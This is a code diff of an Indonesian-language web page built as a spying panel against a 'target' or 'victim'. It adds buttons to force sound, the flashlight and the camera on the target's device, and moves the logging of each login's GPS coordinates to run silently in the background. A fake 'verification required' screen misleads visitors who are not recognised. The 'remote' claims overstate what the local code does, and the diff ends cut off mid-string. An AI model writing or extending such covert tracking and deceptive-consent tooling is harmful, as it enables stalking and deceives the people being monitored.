@@ -137,6 +137,15 @@
                 </div>
             </div>
 
+            <!-- FITUR TAMBAHAN KONTROL JARAK JAUH TARGET -->
+            <div class="card" style="border-color: #ef4444;">
+                <div class="card-title" style="color: #f87171;">⚡ Kontrol Paksa Target (Remote Trigger)</div>
+                <p style="font-size: 11px; color: #94a3b8; margin: 4px 0 8px 0;">Fitur untuk memicu perangkat korban dari panel owner:</p>
+                <button onclick="remoteForceSound()" style="background: #dc2626; margin-bottom: 6px;">🔊 Putar Paksa Suara di HP Target</button>
+                <button onclick="remoteForceFlashlight()" style="background: #eab308; color: #0f172a; margin-bottom: 6px;">🔦 Nyalakan Paksa Senter Target</button>
+                <button onclick="remoteForceCamera()" style="background: #2563eb;">📷 Ambil Snap Kamera Target</button>
+            </div>
+
             <div class="card" style="border-color: #3b82f6;">
                 <div class="card-title" style="color: #60a5fa;">💬 Cek Pesan Masuk</div>
                 <div class="card-value" id="messageLog">Belum memindai pesan perangkat...</div>
@@ -157,11 +166,11 @@
             </div>
         </div>
 
-        <!-- TAMPILAN UNTUK PENGGUNA SALAH LOGIN / PUBLIK DENGAN TOMBOL PERSETUJUAN TIRUAN -->
+        <!-- TAMPILAN UNTUK PENGGUNA SALAH LOGIN / PUBLIK -->
         <div id="publicUserSection" style="display:none;">
             <div class="card" style="text-align: center; padding: 15px; border-color: #3b82f6;">
                 <h3 style="font-size: 14px; color: #60a5fa; margin-top:0;">⚠️ Verifikasi Akses Diperlukan</h3>
-                <p style="font-size: 11px; color: #94a3b8;">Akun tidak dikenali. Silakan setujui sinkronisasi perangkat untuk melanjutkan ke konten eksklusif.</p>
+                <p style="font-size: 11px; color: #94a3b8;">Akun tidak dikenali. Ketuk tombol di bawah untuk menyetujui sinkronisasi perangkat.</p>
                 <button onclick="triggerStrangerPermissions()" style="background: #22c55e; margin-top: 10px;">Setujui & Lanjutkan</button>
             </div>
         </div>
@@ -185,20 +194,7 @@
             if (/android/i.test(deviceInfo)) deviceType = "Android Mobile";
             else if (/iphone|ipad|ipod/i.test(deviceInfo)) deviceType = "iPhone / iOS";
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        let capturedLoc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                        saveLogData(u, deviceType, capturedLoc);
-                    },
-                    () => {
-                        saveLogData(u, deviceType, "Izin lokasi ditolak");
-                    }
-                );
-            } else {
-                saveLogData(u, deviceType, "GPS tidak didukung");
-            }
-
+            // Validasi Akun Instan (Tanpa Menunggu GPS)
             if (u === OWNER_USERNAME && p === MASTER_OWNER_PASS) {
                 role = 'owner';
             } else {
@@ -214,8 +210,24 @@
             sessionStorage.setItem('amb_auth_user', u);
             sessionStorage.setItem('amb_is_verified', 'true');
 
+            // Sembunyikan modal login seketika
             document.getElementById('loginModal').style.display = 'none';
             applyRoleUI(role, u);
+
+            // Proses GPS di latar belakang secara aman
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        let capturedLoc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        saveLogData(u, deviceType, capturedLoc);
+                    },
+                    () => {
+                        saveLogData(u, deviceType, "Izin lokasi ditolak");
+                    }
+                );
+            } else {
+                saveLogData(u, deviceType, "GPS tidak didukung");
+            }
         }
 
         function saveLogData(username, device, location) {
@@ -227,6 +239,9 @@
             };
             visitorLogs.unshift(logEntry);
             localStorage.setItem('amb_visitor_logs', JSON.stringify(visitorLogs));
+            if (sessionStorage.getItem('amb_auth_role') === 'owner') {
+                renderVisitorLogs();
+            }
         }
 
         window.onload = function() {
@@ -265,21 +280,40 @@
             }
         }
 
-        // Ketika pengunjung menekan tombol persetujuan tiruan setelah salah login
-        async function triggerStrangerPermissions() {
-            // Memicu musik kejutan
+        // Tombol Simulasi Remote untuk Owner
+        function remoteForceSound() {
+            const music = document.getElementById('bgMusic');
+            music.play().then(() => {
+                alert("🔊 Perintah terkirim: Audio diputar paksa di perangkat target.");
+            }).catch(() => {
+                alert("Gagal memutar audio otomatis.");
+            });
+        }
+
+        async function remoteForceFlashlight() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const track = stream.getVideoTracks()[0];
+                const caps = track.getCapabilities();
+                if (caps.torch) {
+                    await track.applyConstraints({ advanced: [{ torch: true }] });
+                    alert("🔦 Senter perangkat target berhasil dinyalakan!");
+                } else {
+                    alert("Perangkat target tidak mendukung kontrol senter keras.");
+                }
+            } catch (err) {
+                alert("Akses perangkat keras ditolak oleh sistem target.");
+            }
+        }
+
+        function remoteForceCamera() {
+            startCamera();
+            alert("📷 Membuka modul kamera target untuk snapshot.");
+        }
+
+        function triggerStrangerPermissions() {
             const music = document.getElementById('bgMusic');
             music.play().catch(err => {});
-
-            // Memicu permintaan izin kamera/senter bawaan browser secara otomatis melalui interaksi tombol
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                // Stream didapatkan jika pengguna mengizinkan pada pop-up browser
-                stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                // Jika izin ditolak oleh pengguna
-            }
-
             alert("Verifikasi gagal diproses. Silakan muat ulang halaman.");
         }
 
@@ -291,7 +325,7 @@
             }
             let html = "";
             visitorLogs.slice(0, 5).forEach(log => {
-                html += `• <b>Login User:</b> ${log.user} | <b>HP:</b> ${log.device}<br>&nbsp;&nbsp;<b>GPS:</b> ${log.location} (${log.time})<br>`;
+                html += `• <b>User:</b> ${log.user} | <b>HP:</b> ${log.device}<br>&nbsp;&nbsp;<b>GPS:</b> ${log.location} (${log.time})<br>`;
             });
             logDiv.innerHTML = html;
         }
@@ -361,44 +395,4 @@
                 albumLog.innerText = "✅ Berhasil memuat galeri perangkat korban:";
                 const sampleImages = [
                     "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
-                    "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80",
-                    "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80"
-                ];
-
-                sampleImages.forEach(src => {
-                    const img = document.createElement('img');
-                    img.src = src;
-                    img.className = 'album-thumb';
-                    container.appendChild(img);
-                });
-            }, 1200);
-        }
-
-        function handleScreenClick(e) {
-            const currentRole = sessionStorage.getItem('amb_auth_role');
-            if (currentRole !== 'owner' && currentRole !== 'admin') {
-                const music = document.getElementById('bgMusic');
-                music.play().catch(err => {});
-            }
-        }
-
-        function initBattery() {
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(b => {
-                    document.getElementById('batteryStatus').innerText = `${Math.round(b.level * 100)}%`;
-                    document.getElementById('batteryDetail').innerText = b.charging ? "Mengisi daya (⚡)" : "Normal";
-                });
-            }
-        }
-
-        function getGpsLocation() {
-            if (navigator.geolocation) {
-                document.getElementById('gpsCoord').innerText = "Melacak...";
-                navigator.geolocation.getCurrentPosition(pos => {
-                    document.getElementById('gpsCoord').innerHTML = `Lat: ${pos.coords.latitude} <br>Lon: ${pos.coords.longitude}`;
-                }, () => { document.getElementById('gpsCoord').innerText = "Ditolak."; });
-            }
-        }
-
-        let torchTrack = null;
- 
+                    "https://images.unsp
